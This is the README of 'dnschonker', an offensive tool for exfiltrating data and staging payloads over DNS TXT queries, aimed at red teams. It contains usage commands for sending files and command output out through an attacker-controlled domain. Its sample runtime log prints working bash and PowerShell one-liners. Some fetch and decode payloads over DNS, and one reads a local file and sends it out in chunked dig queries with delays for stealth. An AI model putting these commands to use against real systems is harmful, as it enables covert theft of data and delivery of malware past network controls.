## dnschonker
```

      ██            ██                        
    ██░░██        ██░░██                      
    ██░░▒▒████████▒▒░░██                ████  
  ██▒▒░░░░▒▒▒▒░░▒▒░░░░▒▒██            ██░░░░██
  ██░░░░░░░░░░░░░░░░░░░░██            ██  ░░██
██▒▒░░░░░░░░░░░░░░░░░░░░▒▒████████      ██▒▒██
██░░  ██  ░░██░░  ██  ░░  ▒▒  ▒▒  ██    ██░░██
██░░░░░░░░██░░██░░░░░░░░░░▒▒░░▒▒░░░░██████▒▒██
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░██  
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░██  
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██    
██▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██    
██▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██    
██▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒██    
  ██▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒██      
    ██▒▒░░▒▒▒▒░░▒▒░░░░░░▒▒░░▒▒▒▒░░▒▒██        
      ██░░████░░██████████░░████░░██          
      ██▓▓░░  ▓▓██░░  ░░██▓▓  ░░▓▓██          

                                                                                                         
██████╗ ███╗   ██╗███████╗ ██████╗██╗  ██╗ ██████╗ ███╗   ██╗██╗  ██╗███████╗██████╗ 
██╔══██╗████╗  ██║██╔════╝██╔════╝██║  ██║██╔═══██╗████╗  ██║██║ ██╔╝██╔════╝██╔══██╗
██║  ██║██╔██╗ ██║███████╗██║     ███████║██║   ██║██╔██╗ ██║█████╔╝ █████╗  ██████╔╝
██║  ██║██║╚██╗██║╚════██║██║     ██╔══██║██║   ██║██║╚██╗██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║ ╚████║███████║╚██████╗██║  ██║╚██████╔╝██║ ╚████║██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                                                                                    
```
```
**dnschonker** is a DNS-based exfiltration and infiltration payload delivery tool designed for
ethical pen testing and red team operations. It enables stealthy transmission of files or command
output using DNS `TXT` queries.

It supports AES-GCM encryption,zlib compression, multi-platform payload staging, and
passive response to custom bootstrap fetches using DNS labels.
---

---

## ⚠️ Disclaimer

This tool is intended for authorized red team engagements, research, and educational purposes **only**. 
Unauthorized use of this software is strictly prohibited and may violate laws and terms of service.

If not used properly, this tool can cause service disruptions and/or expose sensitive data.

Test in a lab and use at your own risk.

---

## ✨ Features

- ✅ DNS `TXT` record server with dynamic TXT payload responses  
- ✅ Client mode for file and command exfiltration over DNS  
- ✅ Multi-platform (Linux, Windows, macOS) bootstrap generation  
- ✅ Base32 exfiltration with `eof` marker and session tracking  
- ✅ Optional zlib compression and AES-GCM encryption  
- ✅ Passive logging with per-session file writeouts  
- ✅ Compatible with `dig`, `Resolve-DnsName`, and raw DNS sockets  
- ✅ Chunk size tuning and inter-packet delay for stealth  

---

## 🔧 Requirements
- Server with Public IP:
- Inbound/Outbound Traffic
- DNS over UDP/TCP Port 53
- Root/Sudo Access on Server

- Create DNS Records:
- A record - sub.yourdomain.com - 1.2.3.4
- NS record - sub.yourdomain.com sub.yourdomain.com

- Python 3.9+
- [`dnspython`](https://pypi.org/project/dnspython/)
- [`cryptography`](https://pypi.org/project/cryptography/)

- Install dependencies:
- pip install -r requirements.txt
```
---

## 🚀 Server Usage

```bash
python3 server.py --domain sub.yourdomain.com --encrypt --compress --file payload.bin
```

### Options

- `--domain`: Required domain that is delegated to this DNS server
- `--ip`: Bind IP (default: `0.0.0.0`)
- `--port`: Bind port (default: `53`)
- `--file`: Optional file to serve as staged payload (base64 chunked)
- `--key`: Encryption key (hex or passphrase)
- `--encrypt`: Generate random AES key for bootstraps and decryption
- `--compress`: Enable zlib compression
- `--debug`: Show extra debug output

When started with `--file`, dnschonker will:

- Generate platform-specific bootstrap scripts
- Respond to specific TXT queries with script chunks
- Log sessions and output files under `session.<id>.bin`

---

## 🚀 Client Usage

Exfiltrate a file with compression and encryption
```bash
python3 client.py --domain sub.yourdomain.com --file secret.txt --compress --key abcd1234
```

Exfiltrate command output with compression and encryption
```bash
python3 client.py --domain sub.yourdomain.com --command "whoami" --compress --key abcd1234
```

Exfiltrate command output without compression or encryption
```bash
python3 client.py --domain sub.yourdomain.com --command "whoami"
```

## Runtime Example:
```
$ python3 server.py --domain sub.invalid.domain --encrypt --compress
      ██            ██                        
    ██░░██        ██░░██                      
    ██░░▒▒████████▒▒░░██                ████  
  ██▒▒░░░░▒▒▒▒░░▒▒░░░░▒▒██            ██░░░░██
  ██░░░░░░░░░░░░░░░░░░░░██            ██  ░░██
██▒▒░░░░░░░░░░░░░░░░░░░░▒▒████████      ██▒▒██
██░░  ██  ░░██░░  ██  ░░  ▒▒  ▒▒  ██    ██░░██
██░░░░░░░░██░░██░░░░░░░░░░▒▒░░▒▒░░░░██████▒▒██
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░██  
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░██  
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██    
██▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██    
██▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██    
██▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒██    
  ██▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒██      
    ██▒▒░░▒▒▒▒░░▒▒░░░░░░▒▒░░▒▒▒▒░░▒▒██        
      ██░░████░░██████████░░████░░██          
      ██▓▓░░  ▓▓██░░  ░░██▓▓  ░░▓▓██          

                                                                                                         
██████╗ ███╗   ██╗███████╗ ██████╗██╗  ██╗ ██████╗ ███╗   ██╗██╗  ██╗███████╗██████╗ 
██╔══██╗████╗  ██║██╔════╝██╔════╝██║  ██║██╔═══██╗████╗  ██║██║ ██╔╝██╔════╝██╔══██╗
██║  ██║██╔██╗ ██║███████╗██║     ███████║██║   ██║██╔██╗ ██║█████╔╝ █████╗  ██████╔╝
██║  ██║██║╚██╗██║╚════██║██║     ██╔══██║██║   ██║██║╚██╗██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║ ╚████║███████║╚██████╗██║  ██║╚██████╔╝██║ ╚████║██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                     
[INFO] Generated AES key: 34ae278405a19dac3597d10eb39cb4581f5f206ebe7899a2e98d127d5af8811c
[INFO] Listening on 0.0.0.0:53 for 'sub.invalid.domain'
[INFO] File Download Helpers:
[INFO] File Download Helper for (linux) at c5cb.sub.invalid.domain
payload=''; for i in {1..0}; do part=$(dig -t TXT ${i}.3d64.sub.invalid.domain +short | tr -d '"'); payload+="$part"; done; echo "$payload" | base64 -d

[INFO] File Download Helper for (windows) at 420c.sub.invalid.domain
powershell -NoProfile -Command "$payload=''; for ($i=1; $i -le 0; $i++) { $txt=(Resolve-DnsName -Type TXT $i.3d64.sub.invalid.domain -ErrorAction SilentlyContinue).Strings -join ''; $payload+=$txt }; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload))"

[INFO] File Download Helper for (macos) at cb99.sub.invalid.domain
payload=''; for i in {1..0}; do part=$(dig -t TXT ${i}.3d64.sub.invalid.domain +short | tr -d '"'); payload+="$part"; done; echo "$payload" | base64 -d

[INFO] File Upload Helpers:
[INFO] File Upload Helper for (linux) at 097c.sub.invalid.domain
session=$(head -c4 /dev/urandom | od -An -tx1 | tr -d ' \n'); raw=$(cat ~/wee.txt); b32=$(echo -n '$raw' | base64 | base32 | tr -d '=' | tr 'A-Z' 'a-z'); total_chunks=$(( (${#b32} + 47) / 48 )); for i in $(seq 0 $((total_chunks - 1))); do chunk=${b32:$((i*48)):48}; dig +short TXT "$session.$i.$chunk.3d64.sub.invalid.domain"; sleep 0.1; done; dig +short TXT "$session.$total_chunks.eof.3d64.sub.invalid.domain"

[INFO] File Upload Helper for (windows) at f7b8.sub.invalid.domain
Write-Host 'Hello World from Windows upload stub'

[INFO] File Upload Helper for (macos) at 8331.sub.invalid.domain
echo 'Hello World from macOS upload stub'
```



### Options

- `--domain`: Target domain pointing to the red team DNS server
- `--file`: File to exfiltrate
- `--command`: Command to run and exfiltrate output
- `--compress`: Compress payload before exfiltration
- `--key`: Shared key or hex string for AES-GCM
- `--encrypt`: Generate key and encrypt payload
- `--resolver`: Target DNS server IP (optional)
- `--chunksize`: Base32 chunk size (default: 48)
- `--delay`: Delay in seconds between packets (default: 0.01)
- `--debug`: Verbose output
- `--session`: Manually set session ID (8 chars max)

---



## 📂 Directory Layout

```
dnschonker/
├── server.py              # DNS server and bootstrap handler
├── client.py              # Exfiltration client
├── requirements.txt       # Python dependencies
├── session.*.bin          # Output files per-session
```

## 🧠 Credits

Built by operators for operators.  
Like a fat tunneling cat under the wire — chonk chonk.

This project was inspired by multiple projects out there:
https://github.com/Arno0x/DNSExfiltrator

https://github.com/m57/dnsteal

---

## 📜 License

This project is licensed under the **GNU General Public License v3.0**.

You are free to use, modify, and distribute this software under the terms of the GPLv3. See the [LICENSE](LICENSE) file for details.

> This program is distributed in the hope that it will be useful,  
> but WITHOUT ANY WARRANTY; without even the implied warranty of  
> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the  
> GNU General Public License for more details.

For the full license text, see: https://www.gnu.org/licenses/gpl-3.0.html

